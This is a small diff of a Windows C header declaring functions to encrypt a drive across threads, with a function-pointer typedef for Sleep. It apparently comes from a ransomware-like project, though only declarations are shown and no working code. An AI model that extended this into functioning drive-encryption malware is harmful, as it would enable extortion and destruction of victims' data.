@@ -38,7 +38,7 @@ typedef void(WINAPI* MemeSleep)(DWORD dwMilliseconds);
 
 void threadEncrypt(THREAD_STRUCT* pThreadStruct);
 
-int initThreadStruct();
+int initThreadStruct(int threadCnt);
 
 void launchThreadEncrypt(LPSTR drivePath);
 
